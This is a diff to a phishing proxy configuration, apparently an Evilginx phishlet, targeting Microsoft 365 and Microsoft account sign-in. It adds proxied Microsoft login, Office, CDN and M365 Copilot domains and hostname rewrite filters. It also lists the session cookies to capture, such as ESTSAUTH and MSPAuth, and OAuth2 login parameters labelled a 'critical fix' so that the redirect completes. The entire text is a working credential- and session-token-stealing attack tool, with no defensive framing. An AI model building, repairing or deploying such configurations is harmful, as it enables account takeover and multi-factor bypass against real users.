@@ -4,35 +4,71 @@ min_ver: '3.0.0'
 redirect_url: 'https://www.office.com'
 
 proxy_hosts:
+  # Primary authentication domains
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+  
+  # Office domains
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'substrate', orig_sub: 'substrate', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
+  
+  # M365 Copilot domain (CRITICAL - this is where the final redirect goes)
+  - {phish_sub: 'm365', orig_sub: 'm365', domain: 'cloud.microsoft', session: true, is_landing: false, auto_filter: true}
+  
+  # CDN domains
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'res-1', orig_sub: 'res-1', domain: 'cdn.office.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'res', orig_sub: 'res', domain: 'cdn.office.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'res', orig_sub: 'res', domain: 'public.onecdn.static.microsoft', session: false, is_landing: false, auto_filter: true}
+  
+  # Supporting domains
   - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'fpt', orig_sub: 'fpt', domain: 'live.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'm365', orig_sub: 'm365', domain: 'cloud.microsoft', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'graph', orig_sub: 'graph', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'substrate', orig_sub: 'substrate', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'lifecycle.office.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ecs', orig_sub: 'ecs', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
 
 sub_filters:
+  # From login.microsoftonline.com
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'm365', domain: 'cloud.microsoft', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  
+  # From login.live.com
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'm365', domain: 'cloud.microsoft', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  
+  # From www.office.com
+  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'm365', domain: 'cloud.microsoft', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  
+  # From m365.cloud.microsoft
+  - {triggers_on: 'm365.cloud.microsoft', orig_sub: 'm365', domain: 'cloud.microsoft', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'm365.cloud.microsoft', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'm365.cloud.microsoft', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 
 auth_tokens:
+  # Enterprise cookies (login.microsoftonline.com)
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
   - domain: 'login.microsoftonline.com'
     keys: ['SignInStateCookie', 'esctx', 'buid', 'fpc']
+  
+  # Consumer cookies (login.live.com)
   - domain: '.login.live.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'MSPAuth', 'MSNRPSAuth', 'MSPOK', 'MSPProf', 'MSPSoftVis', 'MSPVis', 'NAP', 'ANON', 'CC', 'PPAuth', 'MSPBack', 'MSPRequ', 'MSPShared', 'MSPSoft', 'WLSSC', 'wlidperf']
   - domain: 'login.live.com'
     keys: ['MSPOK', 'MSPAuth', 'MSNRPSAuth', 'SignInStateCookie', 'wlidperf', 'MSFPC']
+  
+  # Session cookies
   - domain: '.live.com'
     keys: ['MSPOK', 'MSPAuth', 'MSNRPSAuth', 'MSFPC']
   - domain: '.office.com'
@@ -41,6 +77,8 @@ auth_tokens:
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'x-ms-gateway-slice', 'stsservicecookie']
   - domain: '.microsoft.com'
     keys: ['MSFPC']
+  - domain: '.cloud.microsoft'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
 
 credentials:
   username:
@@ -57,13 +95,37 @@ auth_urls:
   - '/kmsi'
   - '/common/login'
   - '/common/oauth2/v2.0/authorize'
+  - '/oauth2/v2.0/authorize'
+  - '/oauth20_authorize.srf'
   - '/ppsecure/post.srf'
   - '/ppsecure/'
   - '/GetCredentialType'
+  - '/login'
+  - '/landingv2'
 
+# CRITICAL FIX: Proper login configuration with OAuth2 parameters
 login:
   domain: 'login.microsoftonline.com'
   path: '/common/oauth2/v2.0/authorize'
+  params:
+    - key: 'client_id'
+      value: '4765445b-32c6-49b0-83e6-1d93765276ca'
+    - key: 'redirect_uri'
+      value: 'https://m365.cloud.microsoft/landingv2'
+    - key: 'response_type'
+      value: 'code id_token'
+    - key: 'scope'
+      value: 'openid profile https://www.office.com/v2/OfficeHome.All'
+    - key: 'response_mode'
+      value: 'form_post'
+    - key: 'nonce'
+      value: '{nonce}'
+    - key: 'state'
+      value: '{state}'
+    - key: 'ui_locales'
+      value: 'en-US'
+    - key: 'mkt'
+      value: 'en-US'
 
 force_post:
   - path: '/kmsi'
